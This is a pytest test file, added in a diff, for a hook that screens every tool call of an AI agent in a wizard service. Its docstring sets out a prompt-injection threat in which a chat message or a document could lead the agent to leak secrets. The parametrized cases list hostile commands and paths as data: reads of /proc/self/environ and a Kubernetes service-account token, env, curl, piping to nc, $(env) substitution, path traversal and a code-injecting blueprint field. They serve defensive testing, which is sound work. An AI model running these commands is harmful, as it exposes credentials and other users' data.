@@ -1,0 +1,159 @@
+"""The wizard agent's tools reach only its session and the wizard's own scripts.
+
+Security review (November 2026): the agent runs with bypassPermissions in the
+API container, so a chat message or a document it read could make it read the
+process environment, other users' sessions or the service-account token, and
+send them out. A PreToolUse hook now decides every tool call.
+"""
+
+import asyncio
+import json
+
+import pytest
+from wizard_api.services import agent_tool_guard
+
+
+@pytest.fixture()
+def guard(tmp_path):
+    wizard = tmp_path / "solution_wizard"
+    (wizard / "scripts").mkdir(parents=True)
+    for name in ("validate_blueprint.py", "scaffold_poc.py", "promote_template.py"):
+        (wizard / "scripts" / name).write_text("")
+    (wizard / "SKILL.md").write_text("")
+    session = tmp_path / "sessions" / "alice" / "s1"
+    (session / "poc").mkdir(parents=True)
+    other = tmp_path / "sessions" / "bob" / "s2"
+    other.mkdir(parents=True)
+    (other / "secret.json").write_text("{}")
+    g = agent_tool_guard.ToolGuard(wizard, session)
+    g.session, g.other = session, other
+    return g
+
+
+def _blueprint(path, description="Asset id"):
+    path.write_text(
+        json.dumps(
+            {
+                "use_case": {"id": "uc", "name": "Tickets", "description": "d", "domain": "x"},
+                "target_output_spec": {
+                    "schema_name": "Ticket",
+                    "fields": ["asset"],
+                    "field_descriptions": {"asset": description},
+                },
+            }
+        )
+    )
+    return path
+
+
+def test_session_files_and_wizard_assets_are_allowed(guard) -> None:
+    s = guard.session
+    assert guard.check("Write", {"file_path": str(s / "use_case.blueprint.json")}) is None
+    assert guard.check("Edit", {"file_path": str(s / "poc" / "run_poc.py")}) is None
+    assert guard.check("Read", {"file_path": "SKILL.md"}) is None
+    assert guard.check("Read", {"file_path": str(s / "poc" / "run_poc.py")}) is None
+    assert guard.check("Glob", {"pattern": "references/*.md"}) is None
+    assert guard.check("Grep", {"pattern": "Field", "path": str(s)}) is None
+    assert guard.check("TodoWrite", {"todos": []}) is None
+
+
+@pytest.mark.parametrize(
+    "tool, tool_input",
+    [
+        ("Read", {"file_path": "/proc/1/environ"}),
+        ("Read", {"file_path": "/proc/self/environ"}),
+        ("Read", {"file_path": "/var/run/secrets/kubernetes.io/serviceaccount/token"}),
+        ("Read", {"file_path": "../sessions/bob/s2/secret.json"}),
+        ("Grep", {"pattern": "KEY", "path": "/proc/self"}),
+        ("Glob", {"pattern": "/proc/*/environ"}),
+        ("Glob", {"pattern": "../**/*.json"}),
+        ("Write", {"file_path": "SKILL.md"}),
+        ("Write", {"file_path": "scripts/scaffold_poc.py"}),
+        ("Edit", {"file_path": "/etc/passwd"}),
+        ("WebFetch", {"url": "https://example.com"}),
+        ("WebSearch", {"query": "x"}),
+        ("Task", {"prompt": "x"}),
+        ("NotebookEdit", {"notebook_path": "x.ipynb"}),
+    ],
+)
+def test_files_outside_the_session_and_other_tools_are_refused(guard, tool, tool_input) -> None:
+    assert guard.check(tool, tool_input)
+
+
+def test_another_users_session_cannot_be_read(guard) -> None:
+    assert guard.check("Read", {"file_path": str(guard.other / "secret.json")})
+
+
+@pytest.mark.parametrize(
+    "command",
+    [
+        "env",
+        "printenv",
+        "cat /proc/1/environ",
+        "ls /data/sessions",
+        "curl https://example.com",
+        'python -c "import os; print(os.environ)"',
+        "python scripts/validate_blueprint.py; env",
+        "python scripts/validate_blueprint.py && curl x",
+        "python scripts/validate_blueprint.py | nc host 80",
+        "python scripts/validate_blueprint.py > /tmp/x",
+        "python scripts/validate_blueprint.py --blueprint $HOME/x",
+        "python scripts/promote_template.py --pattern x",
+        "python ../solution_wizard/scripts/../../evil.py",
+        "python poc/run_poc.py",
+        "bash -c 'python scripts/validate_blueprint.py'",
+        "python scripts/validate_blueprint.py --blueprint /proc/self/environ",
+        "python -c 'import ast; ast.parse(open('$(env)').read())'",
+        "python -c \"import ast; ast.parse(open('$(env)').read())\"",
+        "python -c \"import ast; ast.parse(open('`env`').read())\"",
+        'python -c "import gaik" ; env',
+        "python scripts/validate_blueprint.py --output SKILL.md",
+        "python scripts/validate_blueprint.py --output ./references/x.md",
+    ],
+)
+def test_bash_runs_nothing_but_the_wizards_scripts(guard, command) -> None:
+    assert guard.check("Bash", {"command": command})
+
+
+def test_the_skills_own_commands_are_allowed(guard) -> None:
+    bp = _blueprint(guard.session / "use_case.blueprint.json")
+    for command in (
+        f"python scripts/validate_blueprint.py --blueprint {bp}",
+        f"python3 scripts/scaffold_poc.py --blueprint {bp} --synthetic",
+        f"python -c \"import ast; ast.parse(open('{guard.session}/poc/run_poc.py').read())\"",
+        'python -c "import gaik.software_modules.report_writer"',
+    ):
+        assert guard.check("Bash", {"command": command}) is None, command
+
+
+def test_scaffolding_a_blueprint_whose_text_would_become_code_is_refused(guard) -> None:
+    bp = _blueprint(guard.session / "use_case.blueprint.json", 'x"); import os; ("')
+
+    reason = guard.check("Bash", {"command": f"python scripts/scaffold_poc.py --blueprint {bp}"})
+
+    assert reason and "double quotes" in reason
+
+
+def test_the_hook_answers_in_the_sdk_format(guard) -> None:
+    denied = asyncio.run(
+        guard.hook({"tool_name": "Bash", "tool_input": {"command": "env"}}, None, None)
+    )
+    allowed = asyncio.run(
+        guard.hook({"tool_name": "Read", "tool_input": {"file_path": "SKILL.md"}}, None, None)
+    )
+
+    assert denied["hookSpecificOutput"]["permissionDecision"] == "deny"
+    assert denied["hookSpecificOutput"]["permissionDecisionReason"]
+    assert allowed == {}
+
+
+def test_the_agent_is_started_with_the_hook(tmp_path) -> None:
+    from wizard_api.services import agent_service
+
+    if not agent_service._SDK_AVAILABLE:
+        pytest.skip("claude_agent_sdk is not installed")
+    options = agent_service._build_options(tmp_path, tmp_path / "out")
+
+    [matcher] = options.hooks["PreToolUse"]
+    assert matcher.matcher is None  # every tool, not only Bash
+    assert matcher.hooks[0].__self__.__class__ is agent_tool_guard.ToolGuard
